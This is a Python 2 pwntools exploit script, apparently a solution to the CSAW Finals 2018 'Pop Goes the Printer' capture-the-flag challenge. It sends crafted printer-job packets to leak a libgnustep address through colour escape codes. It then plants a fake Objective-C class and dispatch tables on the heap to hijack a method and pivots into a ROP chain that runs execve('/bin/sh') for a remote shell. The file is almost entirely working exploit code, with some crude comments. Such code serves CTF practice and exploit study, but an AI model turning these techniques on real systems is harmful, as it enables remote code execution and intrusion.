#!/usr/bin/python2

#
# CSAW Finals 2018 - Pop Goes the Printer
# Author: your mom
# Description: totally not based on a software
# that a lot of universities use that is buggy af
# Date: 6/6/6666 6:6:6 GMT+3
# Note: In reality, you would need to massage the 
# heap to make sure your heap offsets are in the
# right position, but we are going to ignore
# that for this challenge and just replicate the
# env with Docker to find the right offsets.
#

import os
from os import unlink
from tempfile import NamedTemporaryFile, gettempdir
from pwn import *
import subprocess

context.log_level = "DEBUG"

PGP_HEADER = b'PGP\x42'
PGP_VERSION = 2

PGPUINT16 = 1
PGPINT16 = 2
PGPUINT32 = 3
PGPINT32 = 4
PGPFLOAT = 5
PGPCONFIG = 6
PGPSTRING = 7
PGPBINARY = 8
PGPCOLOR = 9

PGPCONFIG_INVALID = 0
PGPCONFIG_PRINTMODE = 1
PGPCONFIG_COLORPALLET = 2
PGPCONFIG_INFO = 3
PGPCONFIG_EDIT = 4

PGPRUNJOB = 1
PGPQUEUEJOB = 2
PGPRUNALLJOBS = 4

PGPOBJECT_METHOD_LIST = 0x608680

PGPOBJECT_PARSE_SELECTOR = 0x609260
PARSE_SELECTOR_BOFFSET = 0x65
PARSE_SELECTOR_EOFFSET = 0xd

SECURITY_SELECTOR_BOFFSET = 0x0000000000000065
SECURITY_SELECTOR_EOFFSET = 0x0000000000000017

p = remote("pwn.chal.csaw.io", 1000)
#p = remote("localhost", 28201)
# p = process("./pgtp")
pause()

context.update(endian='big')

challenge = int(p.read().decode().split("===")[-1])
log.info("[+] Got challenge: {}".format(challenge))

be_lazy = """
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <limits.h>

int main(int argc, char** argv) {
    char* shit;
    uint64_t challenge = strtoull(argv[1], &shit, 10);

    if (challenge == 0 || challenge == ULLONG_MAX) {
        printf("Give me a number I can understand you fuck head\\n");
    }

    uint64_t part1 = challenge >> 16 & 0xffff;
    int64_t  part2 = challenge & 0xffff;
    uint64_t part3 = challenge >> 24 & 0xffff;
    int64_t part4 = challenge >> 40 & 0xffff;
    uint64_t part5 = challenge >> 48 & 0xff;
    int64_t part6 = challenge >> 8 & 0xffffff;

    uint64_t const1 = 0xaa55121d;
    uint64_t const2 = 0x09dea8f58120a8ef;
    float const3 = 0x71829394;

    uint64_t checkme = ((part1 * const3) + part2);
    checkme += ((part3 * part4) ^ part5) / const2;
    checkme -= (part6 * const3) / const1;
    printf("Here is your stupid number: %llu\\n", checkme);
    return 0;
}
"""

def do_chal_math(chal):
    # jk, there is no math here, no time for that

    src = NamedTemporaryFile(delete=False, suffix=".c")
    src.write(str.encode(be_lazy))
    src.close()
    bin_file = gettempdir() + "/lazy"

    p = os.system(" ".join(["gcc", "-o", bin_file, src.name]))
    if p != 0:
        log.error("Wow, you can't even be lazy...")
        return -1

    stdout = subprocess.check_output([bin_file, str(chal)])
    val = int(stdout.split(": ")[-1], 10)

    unlink(bin_file)
    return val

class PGPObject(object):
    def __init__(self, _type_, _data, _config_type=0):
        self.type_ = _type_
        self.data = _data
        self.config_type = _config_type
        if type(_data) == bytes:
            self.length = len(_data)
        else:
            self.length = -1

    def encode(self):
        packet = bytes()
        packet += p8(self.type_)
        packet += p8(self.config_type)
        return packet

    def set_length(self, length_):
        self.length = length_

class PGPString(PGPObject):
    def __init__(self, _data, _config_type=0, _config=None):
        super(PGPString, self).__init__(PGPSTRING, _data, _config_type)
        self.config = _config

    def encode(self):
        packet = super(PGPString, self).encode()
        packet += p16(self.length)
        packet += self.data
        packet += self.config.config_encode() if self.config else ""
        return packet

class PGPJob(object):
    def __init__(self, _challenge, _cmd_bits, _objs):
        self.challenge = _challenge
        self.cmd_bits = _cmd_bits
        self.objs = _objs

    def encode(self):
        packet = bytes()
        packet += PGP_HEADER
        packet += p16(PGP_VERSION)
        packet += p64(self.challenge)
        packet += p8(self.cmd_bits)
        packet += p16(len(self.objs))
        for obj in self.objs:
            packet += obj.encode()
        return packet

class PGPConfig(PGPObject):
    def __init__(self):
        super(PGPConfig, self).__init__(PGPCONFIG, 0, 3)
        self.packet = ""
        self.config_packet = ""

    def set_color_pallet(self, colors):
        assert len(colors) < 8

        self.packet = super(PGPConfig, self).encode()
        self.config_packet = p8(len(colors))
        self.config_packet += p8(PGPCONFIG_COLORPALLET)
        for color in colors:
            c = chr(28) + chr(2) + chr(color[0]) + chr(color[1]) + chr(color[2])
            assert len(c) == 5
            self.config_packet += c
        self.packet += self.config_packet

    def set_uninit_config(self, payload):
        self.packet = super(PGPConfig, self).encode()
        self.config_packet = p8(len(payload))
        self.config_packet += p8(PGPCONFIG_EDIT)
        self.config_packet += "".join(payload)
        self.packet += self.config_packet

    def config_encode(self):
        return self.config_packet

    def encode(self):
        return self.packet

class PGPColor(PGPObject):
    def __init__(self, _num):
        super(PGPColor, self).__init__(PGPCOLOR, _num)

    def encode(self):
        packet = super(PGPColor, self).encode()
        packet += p8(self.data)
        return packet

chal_resp = do_chal_math(challenge)

print "[*] Leaking data"

# Parse out colors
def get_color_leak_address(s):
    start = s.index("\x1b[") + 2
    end = s.index("m")
    new_start = end + len("m")
    leak_parts = s[start:end].split(";")

    bit_shift = 0
    leak_addr = 0
    for part in leak_parts:
        addr_part = int(part, 10)
        leak_addr |= addr_part << (8 * bit_shift)
        bit_shift += 1

    return leak_addr, s[new_start:]

pgp_config = PGPConfig()
pgp_config.set_color_pallet([[255, 0, 0]])

pgp_libgnu_string = PGPString("LIBGNUSTEP POINTER", 1, pgp_config)
pgp_libgnu_color = PGPColor(1)
# b *0x404e35
# x/100gx $rax
# Look for addresses in libgnustep

objs = [pgp_config, pgp_libgnu_string, pgp_libgnu_color]
cmd_bits = PGPRUNJOB

job = PGPJob(chal_resp, cmd_bits, objs)
p.send(job.encode())

p.recvuntil("=== PGPPrinter 4.0 ===")
leak = p.recvuntil("k bro")
leak = leak.split("\n", 3)[-1]

libgnu_leak_addr, _ = get_color_leak_address(leak)

libgnu_leak_addr |= 0x7f0000000000
libgnu_leak_addr -= 0x777140
# p _OBJC_Class_NSObject

print "[+] Leaked libgnu address base:", hex(libgnu_leak_addr)

pgp_security_class_dtable_addr = 0x60a1c0 + 0x40
# p _OBJC_Class_PGPSecurity

# Exploit
target_write_addr = pgp_security_class_dtable_addr
target_write_addr_offset_val = 0x0
# gdb$ x/10gx 0x60a1c0+0x40+0x100
# 0x60a300 <_OBJC_METH_VAR_TYPE_2+7>: 0x383a304036316900

# Gadget: libgnustep.so
# 0x00000000001c18ef : push rax ; add al, 0 ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
stack_pivot_gadget = libgnu_leak_addr + 0x00000000001c18ef
# 0x000000000029f493 : pop rdi ; ret
pop_rdi_gadget = libgnu_leak_addr + 0x000000000029f493
# 0x00000000001c313e : pop rsi ; ret
pop_rsi_gadget = libgnu_leak_addr + 0x00000000001c313e
# 0x00000000003b30ff : pop rdx ; add r9b, r9b ; ret
pop_rdx_gadget = libgnu_leak_addr + 0x00000000003b30ff
# 0x00000000000200a8 : pop rax ; ret
pop_rax_gadget = libgnu_leak_addr + 0x00000000000200a8
# 0x0000000000001000 : syscall
syscall_addr = libgnu_leak_addr + 0x0000000000001000

print "[*] Store all required parts onto the heap"

def create_string_get_addr(payload):
    payload_str = "".join(map(lambda x: p64(x)[::-1], payload))

    pgp_config = PGPConfig()
    pgp_config.set_color_pallet([[255, 0, 0]])

    leak_string = PGPString(payload_str, 2, pgp_config)
    leak_color = PGPColor(1)

    objs = [pgp_config, leak_string, leak_color]
    cmd_bits = PGPRUNJOB

    job = PGPJob(chal_resp, cmd_bits, objs)
    p.send(job.encode())

    p.recvuntil("=== PGPPrinter 4.0 ===")
    leak = p.recvuntil("k bro")
    leak = leak.split("\n", 3)[-1]

    leak_addr, _ = get_color_leak_address(leak)
    return leak_addr & 0xffffffff

bin_sh = [
    0x0068732f6e69622f,
]
bin_sh_addr = create_string_get_addr(bin_sh)
print hex(bin_sh_addr)

ropchain = [
    0xdeadbabe,
    pop_rdi_gadget,
    bin_sh_addr,
    pop_rsi_gadget,
    0,
    pop_rdx_gadget,
    0,
    pop_rax_gadget,
    59,
    syscall_addr,
]
ropchain_addr = create_string_get_addr(ropchain)
print hex(ropchain_addr)

security_impl = [
    stack_pivot_gadget
]
security_impl_addr = create_string_get_addr(security_impl)

security_dtable_buckets = [
    security_impl_addr - (8 * SECURITY_SELECTOR_EOFFSET),
]
security_dtable_buckets_addr = create_string_get_addr(security_dtable_buckets)

security_dtable = [
    security_dtable_buckets_addr - (8 * SECURITY_SELECTOR_BOFFSET),
    0,
    0,
    1,
    0,
    0xD00
]
security_dtable_addr = create_string_get_addr(security_dtable)

dtable_buckets = [
    target_write_addr - (8 * PARSE_SELECTOR_EOFFSET),
]
dtable_buckets_addr = create_string_get_addr(dtable_buckets)

dtable = [
    dtable_buckets_addr - (8 * PARSE_SELECTOR_BOFFSET),
    0,
    target_write_addr_offset_val,
    1,
    0,
    0xD00
]
dtable_addr = create_string_get_addr(dtable)

method_list = [
    0,
    1,
    PGPOBJECT_PARSE_SELECTOR,
    0xdeefbeef,
    security_dtable_addr
]
method_list_addr = create_string_get_addr(method_list)

write_class = [
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    PGPOBJECT_METHOD_LIST,
    dtable_addr
]
write_class_addr = create_string_get_addr(write_class)

replace_class = [
    write_class_addr,
    0,
    0,
    0,
    0,
    0,
    0,
    method_list_addr
]

print "[*] Replace PGPObjectV1 class"
PGP_VERSION = 1
payload = map(lambda x: p64(x)[::-1], replace_class)

pgp_config = PGPConfig()
pgp_config.set_uninit_config(payload)

objs = [pgp_config]
cmd_bits = PGPRUNJOB

job = PGPJob(chal_resp, cmd_bits, objs)

p.send(job.encode())
p.recvuntil("k bro")

print "[*] Run another job triggering the method replacement"
objs = []
cmd_bits = PGPRUNJOB

# objs is set to empty array so we don't try to run the method after it is replaced
# challenge_resp goes into rdx
job = PGPJob(ropchain_addr, cmd_bits, objs)

p.send(job.encode())

p.interactive()
